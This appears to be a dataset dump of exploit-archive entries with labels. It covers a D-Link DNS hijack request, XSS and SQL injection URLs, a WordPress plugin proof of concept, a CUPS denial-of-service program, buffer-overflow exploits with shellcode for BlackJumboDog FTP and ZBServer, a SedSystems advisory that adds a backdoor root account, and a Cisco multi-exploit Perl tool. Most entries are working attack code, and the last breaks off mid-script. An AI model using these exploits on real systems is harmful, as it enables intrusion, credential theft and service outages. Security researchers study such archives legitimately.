37237,"D-Link DSL-2780B DLink_1.01.14 - Remote DNS Change   D-Link DSL-2780B DLink_1.01.14    Unauthenticated Remote DNS Change    Copyright 2015 (c) Todor Donev    <todor.donev at gmail.com>   http://www.ethical-hacker.org/   https://www.facebook.com/ethicalhackerorg    No description for morons,    script kiddies & noobs !!    Disclaimer:   This or previous programs is for Educational   purpose ONLY. Do not use it without permission.   The usual disclaimer applies, especially the   fact that Todor Donev is not liable for any   damages caused by direct or indirect use of the   information or functionality provided by these   programs. The author or any Internet provider   bears NO responsibility for content or misuse   of these programs or any derivatives thereof.   By using these programs you accept the fact   that any damage (dataloss, system crash,   system compromise, etc.) caused by the use   of these programs is not Todor Donev's   responsibility.      Use them at your own risk!   [todor@adamantium ~]$ GET ""http://TARGET/dnscfg.cgi?dnsSecondary=8.8.4.4&dnsIfcsList=&dnsRefresh=1"" 0&> /dev/null <&1",D-Link DSL-2780B DLink_1.01.14,1
36626,"OSClass 2.3.3 - 'index.php?getParam()' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/51662/info   OSClass is prone to SQL-injection and cross-site scripting vulnerabilities.   Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   OSClass 2.3.3 is vulnerable; other versions may also be affected.   http://www.example.com/index.php?page=search&sCity=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/scrip t%3E  http://www.example.com/index.php?page=search&sPattern=%3C/title%3E%3Cscript%3Ealert%28document.cookie%29; %3C/script%3E  http://www.example.com/index.php?page=search&sPriceMax=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/s cript%3E  http://www.example.com/index.php?page=search&sPriceMin=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/s cript%3E",OSClass,1
21181,"Microsoft Internet Explorer 6.0 / Mozilla 0.9.6 / Opera 5.1 - Image Count Denial of Service source: https://www.securityfocus.com/bid/3684/info  An issue which affects users of multiple web browsers on Microsoft Windows platforms has been discovered.  An unusually high image count may cause a denial of services to users who view the webpage containing the offending image.  Malicious webmasters may construct webpages which exploit this vulnerability.   <script> for(i=0;i<100000000;i++) { document.write(""<img src=http://fakehost.com/""+i+"".gif>""); } </script>",Microsoft Internet Explorer,1
33413,"Pluxml-Blog 4.2 - '/core/admin/auth.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/37384/info  Pluxml-Blog is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Pluxml-Blog 4.2 is vulnerable; other versions may also be affected.   http://www.example.com/[path]/core/admin/auth.php?p=1"">",Pluxml-Blog,1
29401,"CreateAuction - 'Cats.asp' SQL Injection source: https://www.securityfocus.com/bid/21929/info  Createauction is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.  http://www.example.com/[path]/cats.asp?catid=1%20%20and%201=convert(int,(select%20top%201%20username%2b'/'%2bpassword%20from%20users))--sp_password",CreateAuction,1
36086,"WordPress Plugin WonderPlugin Audio Player 2.0 - Blind SQL Injection / Cross-Site Scripting # Exploit Title: WonderPlugin Audio Player 2.0 Blind SQL Injection and XSS # Date: 20-01-2015 # Software Link: http://www.wonderplugin.com/wordpress-audio-player/ # Exploit Author: Kacper Szurek # Contact: http://twitter.com/KacperSzurek # Website: http://security.szurek.pl/ # Category: webapps  1. Description    wp_ajax_save_item() is accessible for every registered user (admin privileges are not checked).  save_item() uses is_id_exist() in which $id is not escaped properly.  2. Proof of Concept  Login as standard user (created using wp-login.php?action=register) then:  <form method=""post"" action=""http://wordpress-url/wp-admin/admin-ajax.php?action=wonderplugin_audio_save_item"">     <input type=""text"" name=""item[id]"" value=""1 UNION (SELECT 1, 2, 3, 4, IF(substr(user_pass,1,1) = CHAR(36), SLEEP(5), 0) FROM `wp_users` WHERE ID = 1)"">     <input type=""submit"" value=""Hack!""> </form>  This SQL will check if first password character user ID=1 is ""$"".  If yes it will sleep 5 seconds.  For XSS use:  <form method=""post"" action=""http://wordpress-url/wp-admin/admin-ajax.php?action=wonderplugin_audio_save_item"">     <input type=""hidden"" name=""item[id]"" value=""1"">     <input type=""text"" name=""item[name]"" value='<script>alert(String.fromCharCode(88,83,83));</script>'>     <input type=""text"" name=""item[customcss]"" value='</style><script>alert(String.fromCharCode(88,83,83));</script>'>     <input type=""submit"" value=""Hack!""> </form>  It will be visible on every page where shortcode wonderplugin_audio is used and also in admin panel:  http://wordpress-url/wp-admin/admin.php?page=wonderplugin_audio_show_items  http://security.szurek.pl/wonderplugin-audio-player-20-blind-sql-injection-and-xss.html  3. Solution:    Update to version 2.1",WordPress Plugin WonderPlugin Audio Player,1
1196,"CUPS Server 1.1 - GET Denial of Service /* dl-cups.c v0.1  * CUPS server freeze and processor load ""fuckup"" exploit  * bug found and exploit coded by tracewar  (darklogic team)  * for educaional purposes only.  *****************************************************************  * greetz goes to:  * setuid, matan.  */  #include <stdio.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <netdb.h>  char EVIL[] = ""\x2e\x2e\x5c\x2e\x2e"";  void usage(char *argv0) { 	fprintf(stdout, ""cups/1.x server freeze and remote cpu usage fuckup\n""); 	fprintf(stdout, ""exploit coded and bug found by tracewar of darklogic\n\n""); 	fprintf(stdout, ""usage: %s remote_host remote_port\n"", argv0); 	exit(0); }  int main(int argc, char **argv) { 	char	buffer[50] = ""GET /""; 	int	sock;         struct	sockaddr_in	serv_addr;         struct	hostent	*crap;  	if(argc != 3) 		usage(argv[0]);  	printf(""# Making our evil buffer... "");	 	snprintf(&buffer[5], 47, ""%s"", EVIL);         	strcat(buffer, ""\r\n""); 	printf(""(done)\n"");          sock = socket(AF_INET, SOCK_STREAM, 0);         if(sock < 0)                 return printf(""# error creating socket.\n"");         crap = gethostbyname(argv[1]);         if(crap == NULL)                 return printf(""# cant resolve the specified hostname: %s\n"", argv[1]);         else                 printf(""# connecting to victim... "");          serv_addr.sin_family = AF_INET;         serv_addr.sin_port = htons(atoi(argv[2]));         bcopy((char *)crap->h_addr, (char *)&serv_addr.sin_addr.s_addr, crap->h_length);          if (connect(sock, &serv_addr, sizeof(serv_addr)) < 0)                 return printf(""(error)\n# check again %s:%d\n"", argv[1], atoi(argv[2]));          printf(""(done)\n# sending crafted string... "");         if( (send(sock, buffer, strlen(buffer), 0)) == -1 )                 return printf(""\n# error while sending the crafted string.!\n""); 	close(sock);         return puts(""(done)\n# The server should be frozen now with 100\% cpu usage."");  }  // milw0rm.com [2005-09-05]",CUPS Server,1
378,"BlackJumboDog FTP Server - Remote Buffer Overflow #!/usr/bin/perl # # blackJumboDog Exploit code by Tal zeltzer #  use strict; use IO::Socket::INET;  usage() unless(@ARGV == 2);  my $host = shift(@ARGV); my $port = shift(@ARGV);  # win32_bind - Encoded Shellcode [\x00\x0a\x09] [ EXITFUNC=seh LPORT=4444 Size=399 ] http://metasploit.com my $shellcode = ""\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\x4f\x85"". ""\x2f\x98\x83\xeb\xfc\xe2\xf4\xb3\x6d\x79\x98\x4f\x85\x7c\xcd\x19"". ""\xd2\xa4\xf4\x6b\x9d\xa4\xdd\x73\x0e\x7b\x9d\x37\x84\xc5\x13\x05"". ""\x9d\xa4\xc2\x6f\x84\xc4\x7b\x7d\xcc\xa4\xac\xc4\x84\xc1\xa9\xb0"". ""\x79\x1e\x58\xe3\xbd\xcf\xec\x48\x44\xe0\x95\x4e\x42\xc4\x6a\x74"". ""\xf9\x0b\x8c\x3a\x64\xa4\xc2\x6b\x84\xc4\xfe\xc4\x89\x64\x13\x15"". ""\x99\x2e\x73\xc4\x81\xa4\x99\xa7\x6e\x2d\xa9\x8f\xda\x71\xc5\x14"". ""\x47\x27\x98\x11\xef\x1f\xc1\x2b\x0e\x36\x13\x14\x89\xa4\xc3\x53"". ""\x0e\x34\x13\x14\x8d\x7c\xf0\xc1\xcb\x21\x74\xb0\x53\xa6\x5f\xce"". ""\x69\x2f\x99\x4f\x85\x78\xce\x1c\x0c\xca\x70\x68\x85\x2f\x98\xdf"". ""\x84\x2f\x98\xf9\x9c\x37\x7f\xeb\x9c\x5f\x71\xaa\xcc\xa9\xd1\xeb"". ""\x9f\x5f\x5f\xeb\x28\x01\x71\x96\x8c\xda\x35\x84\x68\xd3\xa3\x18"". ""\xd6\x1d\xc7\x7c\xb7\x2f\xc3\xc2\xce\x0f\xc9\xb0\x52\xa6\x47\xc6"". ""\x46\xa2\xed\x5b\xef\x28\xc1\x1e\xd6\xd0\xac\xc0\x7a\x7a\x9c\x16"". ""\x0c\x2b\x16\xad\x77\x04\xbf\x1b\x7a\x18\x67\x1a\xb5\x1e\x58\x1f"". ""\xd5\x7f\xc8\x0f\xd5\x6f\xc8\xb0\xd0\x03\x11\x88\xb4\xf4\xcb\x1c"". ""\xed\x2d\x98\x5e\xd9\xa6\x78\x25\x95\x7f\xcf\xb0\xd0\x0b\xcb\x18"". ""\x7a\x7a\xb0\x1c\xd1\x78\x67\x1a\xa5\xa6\x5f\x27\xc6\x62\xdc\x4f"". ""\x0c\xcc\x1f\xb5\xb4\xef\x15\x33\xa1\x83\xf2\x5a\xdc\xdc\x33\xc8"". ""\x7f\xac\x74\x1b\x43\x6b\xbc\x5f\xc1\x49\x5f\x0b\xa1\x13\x99\x4e"". ""\x0c\x53\xbc\x07\x0c\x53\xbc\x03\x0c\x53\xbc\x1f\x08\x6b\xbc\x5f"". ""\xd1\x7f\xc9\x1e\xd4\x6e\xc9\x06\xd4\x7e\xcb\x1e\x7a\x5a\x98\x27"". ""\xf7\xd1\x2b\x59\x7a\x7a\x9c\xb0\x55\xa6\x7e\xb0\xf0\x2f\xf0\xe2"". ""\x5c\x2a\x56\xb0\xd0\x2b\x11\x8c\xef\xd0\x67\x79\x7a\xfc\x67\x3a"". ""\x85\x47\x68\xc5\x81\x70\x67\x1a\x81\x1e\x43\x1c\x7a\xff\x98"";  my $socket = IO::Socket::INET->new(proto=>'tcp',PeerAddr=>$host,PeerPort=>$port); $socket or die ""Cannot connect to host!\n"";  print ""[+] Connected to host\r\n"";  $socket->autoflush(1);  #receive banner  my $repcode = ""220 ""; my $response = recv_reply($socket,$repcode);  #send USER command  my $username = ""anonymous""; print $socket ""USER $username\r\n"";  $repcode = """";  select(undef, undef, undef, 1.002); # sleep of 1.2 sec   #Send PASS Command ( Evil Buffer ) # EIP At 308 # 7C4E2F60 - jmp ebx On kernel32.dll ( Windows 2000 SP4 )  printf ""[+] Sending shellcode\r\n"";  my $buf = ""A""x308; $buf = $buf . ""\xEB\x06\xEB\x06""; # Jump 6 bytes forward $buf = $buf . ""\x60\x2F\x4E\x7C""; $buf = $buf . $shellcode; print $socket ""PASS $buf\r\n"";  select(undef, undef, undef, 1.002); # sleep of 1.2 sec   $repcode = """"; recv_reply($socket, $repcode);  close($socket);  system(""telnet $host 4444"");  exit(0);   sub usage { # print usage information print ""\nUsage: jumbo.pl <host> <port>\n <host> - The host to connect to <port> - The TCP port\n\n""; exit(1); }  sub recv_reply { # retrieve any reply my $socket = shift; my $repcode = shift; $socket or die ""Can't receive on socket\n"";  my $res=""""; while(<$socket>) { $res .= $_; if (/$repcode/) { last; } } return $res; }  # milw0rm.com [2004-08-05]",BlackJumboDog FTP Server,1
41877,"SedSystems D3 Decimator - Multiple Vulnerabilities SedSystems D3 Decimator Multiple Vulnerabilities ================================================ Identification of the vulnerable device can be performed by scanning for  TCP port 9784 which offers a default remote API. When connected to this  device it will announce itself with ""connected"" or similar:  Connected to x.x.x.x. Escape character is '^]'. connected status status:3.1,3.0.12-1,0,0,41.0,Valid,Valid,540,-1.0,-1.0,5.1,11.4,-1.0 ping ping:ok  The web service by default has a user interface for accessing the RF  spectrum analyzer capability. The device itself from the API can give  raw remote access to I/Q samples so can be used to remotely sniff the  RF spectrum. The Web Configuration Manager can be found on  ""/cgi-bin/wcm.cgi"". Multiple vulnerabilities exist.  Hardcoded credentials can be found in the /etc/passwd files contained  within the default firmware since at least February 2013. The following  entries can be found:  root:$1$zfy/fmyt$khz2yIyTFDoCkhxWw7eX8.:0:0:root:/:/bin/sh admin:$1$$CoERg7ynjYLsj2j4glJ34.:1000:0:root:/:/bin/webonly  The admin user has a default password of ""admin"", at this time the root  user password is unknown however there is no documented way of changing  this trivially in a device. Using the ""admin"" user you can obtain a web  session to the wcm.cgi and exploit a hidden arbitary file download  vulnerability discovered by reverse engineering the firmware:  http://x.x.x.x/cgi-bin/wcm.cgi?sessionid=009d45ecbabe015babe3300f&download=true&fullfilename=/etc/passwd  This will allow you to download any file and as the ""admin"" user has root privileges you can obtain access to any file on the device. To execute  arbitary code you can make use of a vulnerbaility within the firmware  flash routines. By uploading a crafted tarball that contains a ""install""  script in its root, the device will accept your firmware and then attempt to execute ./install if found as root, you can then cancel the ""flash""  process to prevent bricking/modifcation of the device. The problem is due to /usr/bin/install_flash which after using ""tar"" to unpack an archive  to a tmp folder of /tmp/PID_of_tar does the following:      80  # If the archive contained its own install script then use that     81       82  if [ -x ./install ]; then     83      ./install $all_args     84      rc=$?     85      exit $rc     86  fi     87    Using this vulnerability you can upload a .tar file containing an install file that looks like the following to obtain a root user account with  adm1n/admin.  cat install  #!/bin/sh echo adm1n:\$1\$\$CoERg7ynjYLsj2j4glJ34.:0:0:root:/:/bin/sh >> /etc/passwd  You can then SSH remotely to the device as PermitRootLogin is enabled  by default.  E.g.  $ ssh  -l adm1n x.x.x.x adm1n@x.x.x.x's password: admin  # uname -a Linux d3-decimator-540 2.6.34.10 #1 PREEMPT Wed Aug 8 10:04:25 CST 2012 armv5tejl GNU/Linux # cat /proc/cpuinfo Processor	: ARM926EJ-S rev 4 (v5l) BogoMIPS	: 103.83 Features	: swp half thumb fastmult vfp edsp java  CPU implementer	: 0x41 CPU architecture: 5TEJ CPU variant	: 0x0 CPU part	: 0x926 CPU revision	: 4  Hardware	: SED 32XX Based CCA Revision	: 0000 Serial		: 0000000000000000 #   Vendor website can be found at the following url: * http://www.sedsystems.ca/decimator_spectrum_analyzer   -- prdelka",SedSystems,0
19689,"ZBServer Pro 1.5 - Remote Buffer Overflow (2) // source: https://www.securityfocus.com/bid/889/info   ZBSoft ZBServer Pro is an Internet and Intranet server that supports HTTP, Gopher, FTP and Chat Services. ZBServer is available for Microsoft Windows operating systems.   ZBServer Pro 1.5 has an unchecked buffer in the code that handles GET requests. This weakness allows for the execution of arbitrary code.   /** slzbserv.c - local/remote exploit for ZBServer PRO 1.50-r1x (WinNT)  **  ** ZBServer PRO 1.50-r1x exploit gets remote servers's full control.  ** When you attacks a vulnerable server you can run abitrary code  ** inside. Firstly, sploit creates an advisory file. It's information  ** for administrative use. Later, exploit restores and kills  ** overflowed thread but before it patchs some error information so  ** all error pages will appear like hacked pages.  **  ** Compile on Debian with kernel 2.2.12: gcc -o  slzbserv slzbserv.c  ** run: ./slzbserv hostname  **  ** http://mareasvivas.cjb.net / http://www.deepzone.org  **  ** Coded by |Zan | izan@galaxycorp.com  **  **/   #include <stdio.h> #include <unistd.h> #include <sys/socket.h> #include <netinet/in.h> #include <sys/errno.h> #include <netdb.h>  #define _PORT   80 #define _TamBuf 770  char crash[] =  ""GET /"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x81\xc7\xc8\x10\x10\x10\x81\xef\x10"" ""\x10\x10\x10\x57\x5e\x33\xc0\x66\xb8\x31\x02\x90\x90\x50"" ""\x59\xac\x34\x99\xaa\xe2\xfa\x71\x99\x99\x99\x99\xc4\x18"" ""\x74\xb1\x89\xd9\x99\xf3\x99\xf1\x19\x99\x99\x99\xf3\x9b"" ""\xf3\x99\xf3\x99\xf1\x99\x99\x99\xd9\x14\x2c\xac\x8b\xd9"" ""\x99\xcf\xf1\x19\x02\xd4\x99\xc3\x66\x8b\xc9\xc2\xf3\x99"" ""\x14\x24\x3a\x89\xd9\x99\xaa\x59\x32\x14\x2c\x3a\x89\xd9"" ""\x99\xcf\xf1\xd3\x98\x99\x99\x09\x14\x2c\x72\x89\xd9\x99"" ""\xcf\xca\xf1\x49\x05\xd4\x99\xc3\x66\x8b\xca\xf1\x05\x02"" ""\xd4\x99\xc3\x66\x8b\xf1\xa9\xd4\xde\x99\xc6\x14\x2c\x3e"" ""\x89\xd9\x99\xf3\xdd\x09\x09\x09\x09\xc0\x35\x33\x7b\x65"" ""\xf3\x99\x23\x31\x02\xd4\x99\x66\x8b\x99\x99\x99\x99\xca"" ""\xfc\xeb\xef\xfc\xeb\xb9\xf1\xf8\xfa\xf2\xfc\xfd\xb7\xa5"" ""\xb6\xf1\xab\xa7\xf1\xed\xed\xe9\xa3\xb6\xb6\xee\xee\xee"" ""\xb7\xfd\xfc\xfc\xe9\xe3\xf6\xf7\xfc\xb7\xf6\xeb\xfe\xb9"" ""\xb9\xca\xe9\xf5\xf6\xf0\xed\xb9\xfa\xf6\xfd\xfc\xfd\xb9"" ""\xfb\xe0\xb9\xe5\xc3\xf8\xf7\xb9\xe4\xa3\xb0\xa5\xf1\xed"" ""\xf4\xf5\xa7\xa5\xf1\xfc\xf8\xfd\xa7\xa5\xed\xf0\xed\xf5"" ""\xfc\xa7\xca\xfc\xeb\xef\xfc\xeb\xb9\xf1\xf8\xfa\xf2\xfc"" ""\xfd\xb7\xa5\xb6\xed\xf0\xed\xf5\xfc\xa7\xa5\xb6\xf1\xfc"" ""\xf8\xfd\xa7\xa5\xfb\xf6\xfd\xe0\xa7\xa5\xfa\xfc\xf7\xed"" ""\xfc\xeb\xa7\xd1\xfc\xf5\xf5\xf6\xb7\xb9\xc0\xf6\xec\xb9"" ""\xf8\xeb\xfc\xb9\xeb\xec\xf7\xf7\xf0\xf7\xfe\xb9\xf8\xb9"" ""\xc3\xdb\xca\xfc\xeb\xef\xfc\xeb\xb9\xc9\xcb\xd6\xea\xb9"" ""\xfb\xec\xfe\xfe\xe0\xb9\xef\xfc\xeb\xea\xf0\xf6\xf7\xb9"" ""\xf8\xf7\xfd\xb9\xe0\xf6\xec\xb9\xf1\xf8\xef\xfc\xb9\xfb"" ""\xfc\xfc\xf7\xb9\xf8\xfb\xec\xea\xfc\xfd\xb7\xa5\xe9\xa7"" ""\xd4\xf6\xeb\xfc\xb9\xf0\xf7\xff\xf6\xeb\xf4\xf8\xed\xf0"" ""\xf6\xf7\xb9\xfa\xf8\xf7\xb9\xfb\xfc\xb9\xfd\xf6\xee\xf7"" ""\xf5\xf6\xf8\xfd\xb9\xff\xeb\xf6\xf4\xb9\xf1\xed\xed\xe9"" ""\xa3\xb6\xb6\xee\xee\xee\xb7\xfd\xfc\xfc\xe9\xe3\xf6\xf7"" ""\xfc\xb7\xf6\xeb\xfe\xb9\xf6\xeb\xb9\xf1\xed\xed\xe9\xa3"" ""\xb6\xb6\xf4\xf8\xeb\xfc\xf8\xea\xef\xf0\xef\xf8\xea\xb7"" ""\xfa\xf3\xfb\xb7\xf7\xfc\xed\xa5\xe9\xa7\xeb\xfc\xfe\xf8"" ""\xeb\xfd\xea\xb9\xed\xf6\xb9\xdd\xfc\xfc\xe9\xc3\xf6\xf7"" ""\xfc\xb9\xfa\xeb\xfc\xee\xb9\xb1\xcd\xf1\xfc\xce\xf0\xe3"" ""\xf8\xeb\xfd\xb5\xb9\xd8\xf7\xec\xea\xf2\xf8\xb9\xf8\xf7"" ""\xfd\xb9\xd7\xfc\xf4\xf6\xb0\xa5\xe9\xa7\xda\xf6\xfd\xfc"" ""\xfd\xb9\xfb\xe0\xb9\xe5\xc3\xf8\xf7\xb7\xa5\xb6\xfa\xfc"" ""\xf7\xed\xfc\xeb\xa7\xa5\xb6\xfb\xf6\xfd\xe0\xa7\xa5\xb6"" ""\xf1\xed\xf4\xf5\xa7\xb7\xc5\xf1\xed\xf4\xf5\xc5\xca\xfc"" ""\xeb\xef\xfc\xeb\xd8\xfb\xec\xea\xfc\xfd\xfb\xe0\xf0\xc3"" ""\xf8\xf7\xb7\xf1\xed\xf4\xf5\x99\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\xac\xe0\xe3\x01"";   int     sock; struct  sockaddr_in sock_a; struct  hostent *host;  int main (int argc, char *argv[]) {   printf(""\nWinNT 4.0 sp5 ZBServer PRO 1.50-r1x exploit\n"");  printf(""http://mareasvivas.cjb.net - http://www.deepzone.org\n\n"");  printf(""Coded by -=[ |Zan ]=-  izan@galaxycorp.com - izan@deepzone.org\n\n"");   if(argc < 2) {    fprintf(stderr, ""Error : Usage: %s <hostname> \n"", argv[0]);    exit(0);   }    if((host=(struct hostent *)gethostbyname(argv[1])) == NULL) {     perror(""gethostbyname"");     exit(-1);   }   if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {     perror(""create socket"");     exit(-1);   }   sock_a.sin_family=AF_INET;  sock_a.sin_port=htons(_PORT);  memcpy((char *)&sock_a.sin_addr,(char *)host->h_addr,host->h_length);  if(connect(sock,(struct sockaddr *)&sock_a,sizeof(sock_a))!=0) {     perror(""create connect"");     exit(-1);   }    fflush(stdout);    write(sock,crash,_TamBuf);   write(sock,""\n\n"", 2);   printf(""done.\n\n"");  }",ZBSoft ZBServer Pro,1
21100,"Cisco Secure IDS 2.0/3.0 / Snort 1.x / ISS RealSecure 5/6 / NFR 5.0 - Encoded IIS Detection Evasion source: https://www.securityfocus.com/bid/3292/info  The Microsoft IIS web server supports a non-standard method of encoding web requests. Because this method is non-standard, intrusion detection systems may not detect attacks encoded using this method.  This vulnerability only affects intrusion detection systems in environments where '%u' unicode encoding is supported by a webserver (ie, IIS). If there is no webserver support for this encoding method or if it is disabled, there will be no targets to which encoded attacks can be sent.  **NOTE**: Only RealSecure, Dragon and Snort are confirmed vulnerable. It is highly likely that IDS systems from other vendors are vulnerable as well, however we have not recieved confirmation. This record will be updated as more information becomes available regarding affected technologies.  BlackICE products detect '%u' encoded requests as being invalid, but do not decode them and detect encoded attack signatures.   #!/usr/bin/perl  ## # Cisco Global Exploiter # # Legal notes : # The BlackAngels staff refuse all responsabilities # for an incorrect or illegal use of this software # or for eventual damages to others systems. # # http://www.blackangels.it ##    ## # Modules ##  use Socket; use IO::Socket;   ## # Main ##  $host = """"; $expvuln = """"; $host = @ARGV[ 0 ]; $expvuln = @ARGV[ 1 ];  if ($host eq """") { usage(); } if ($expvuln eq """") { usage(); } if ($expvuln eq ""1"") { cisco1(); } elsif ($expvuln eq ""2"") { cisco2(); } elsif ($expvuln eq ""3"") { cisco3(); } elsif ($expvuln eq ""4"") { cisco4(); } elsif ($expvuln eq ""5"") { cisco5(); } elsif ($expvuln eq ""6"") { cisco6(); } elsif ($expvuln eq ""7"") { cisco7(); } elsif ($expvuln eq ""8"") { cisco8(); } elsif ($expvuln eq ""9"") { cisco9(); } elsif ($expvuln eq ""10"") { cisco10(); } elsif ($expvuln eq ""11"") { cisco11(); } elsif ($expvuln eq ""12"") { cisco12(); } elsif ($expvuln eq ""13"") { cisco13(); } elsif ($expvuln eq ""14"") { cisco14(); } else { printf ""\nInvalid vulnerability number ...\n\n""; exit(1); }   ## # Functions ##  sub usage {   printf ""\nUsage :\n"";   printf ""perl cge.pl <target> <vulnerability number>\n\n"";   printf ""Vulnerabilities list :\n"";   printf ""[1] - Cisco 677/678 Telnet Buffer Overflow Vulnerability\n"";   printf ""[2] - Cisco IOS Router Denial of Service Vulnerability\n"";   printf ""[3] - Cisco IOS HTTP Auth Vulnerability\n"";   printf ""[4] - Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability\n"";   printf ""[5] - Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability\n"";   printf ""[6] - Cisco 675 Web Administration Denial of Service Vulnerability\n"";   printf ""[7] - Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability\n"";   printf ""[8] - Cisco IOS Software HTTP Request Denial of Service Vulnerability\n"";   printf ""[9] - Cisco 514 UDP Flood Denial of Service Vulnerability\n"";   printf ""[10] - CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability\n"";   printf ""[11] - Cisco Catalyst Memory Leak Vulnerability\n"";   printf ""[12] - Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability\n"";   printf ""[13] - %u Encoding IDS Bypass Vulnerability (UTF)\n"";   printf ""[14] - Cisco IOS HTTP Denial of Service Vulnerability\n"";   exit(1); }  sub cisco1 # Cisco 677/678 Telnet Buffer Overflow Vulnerability {   my $serv = $host;   my $dch = ""?????????????????a~ %%%%%XX%%%%%"";   my $num = 30000;   my $string .= $dch x $num;   my $shc=""\015\012"";    my $sockd = IO::Socket::INET->new (                                      Proto => ""tcp"",                                      PeerAddr => $serv,                                      PeerPort => ""(23)"",                                      ) || die(""No telnet server detected on $serv ...\n\n"");    $sockd->autoflush(1);   print $sockd ""$string"". $shc;   while (<$sockd>){ print }   print(""\nPacket sent ...\n"");   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto => ""tcp"",                                       PeerAddr => $serv,                                       PeerPort => ""(23)"",                                       ) || die(""Vulnerability successful exploited. Target server is down ...\n\n"");    print(""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"");   close($sockd2);   exit(1); }  sub cisco2 # Cisco IOS Router Denial of Service Vulnerability {   my $serv = $host;    my $sockd = IO::Socket::INET->new (                                      Proto=>""tcp"",                                      PeerAddr=>$serv,                                      PeerPort=>""http(80)"",);                                      unless ($sockd){die ""No http server detected on $serv ...\n\n""};   $sockd->autoflush(1);   print $sockd ""GET /\%\% HTTP/1.0\n\n"";   -close $sockd;   print ""Packet sent ...\n"";   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$serv,                                       PeerPort=>""http(80)"",);                                       unless ($sockd2){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print(""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"");   close($sockd2);   exit(1); }  sub cisco3 # Cisco IOS HTTP Auth Vulnerability {   my $serv= $host;   my $n=16;   my $port=80;   my $target = inet_aton($serv);   my $fg = 0;    LAB: while ($n<100) {   my @results=exploit(""GET /level/"".$n.""/exec/- HTTP/1.0\r\n\r\n"");   $n++;   foreach $line (@results){           $line=~ tr/A-Z/a-z/;           if ($line =~ /http\/1\.0 401 unauthorized/) {$fg=1;}           if ($line =~ /http\/1\.0 200 ok/) {$fg=0;}   }    if ($fg==1) {                sleep(2);                print ""Vulnerability unsuccessful exploited ...\n\n"";               }   else {         sleep(2);         print ""\nVulnerability successful exploited with [http://$serv/level/$n/exec/....] ...\n\n"";         last LAB;        }    sub exploit {                my ($pstr)=@_;                socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||                die(""Unable to initialize socket ...\n\n"");                if(connect(S,pack ""SnA4x8"",2,$port,$target)){                                                             my @in;                                                             select(S);                                                             $|=1;                                                             print $pstr;                                                             while(<S>){ push @in, $_;}                                                             select(STDOUT); close(S); return @in;                                                            }   else { die(""No http server detected on $serv ...\n\n""); }   }   }   exit(1); }  sub cisco4 # Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability {   my $serv = $host;   my $n = 16;    while ($n <100) {                    exploit1(""GET /level/$n/exec/- HTTP/1.0\n\n"");                    $wr =~ s/\n//g;                    if ($wr =~ /200 ok/) {                                               while(1)                                               { print ""\nVulnerability could be successful exploited. Please choose a type of attack :\n"";                                                 print ""[1] Banner change\n"";                                                 print ""[2] List vty 0 4 acl info\n"";                                                 print ""[3] Other\n"";                                                 print ""Enter a valid option [ 1 - 2 - 3 ] : "";                                                 $vuln = <STDIN>;                                                 chomp($vuln);                     if ($vuln == 1) {                                     print ""\nEnter deface line : "";                                     $vuln = <STDIN>;                                     chomp($vuln);                                     exploit1(""GET /level/$n/exec/-/configure/-/banner/motd/$vuln HTTP/1.0\n\n"");                                    }                    elsif ($vuln == 2) {                                        exploit1(""GET /level/$n/exec/show%20conf HTTP/1.0\n\n"");                                        print ""$wrf"";                                       }                    elsif ($vuln == 3)                                       { print ""\nEnter attack URL : "";                                         $vuln = <STDIN>;                                         chomp($vuln);                                         exploit1(""GET /$vuln HTTP/1.0\n\n"");                                         print ""$wrf"";                                       }          }          }          $wr = """";          $n++;   }   die ""Vulnerability unsuccessful exploited ...\n\n"";    sub exploit1 {                 my $sockd = IO::Socket::INET -> new (                                                      Proto => 'tcp',                                                      PeerAddr => $serv,                                                      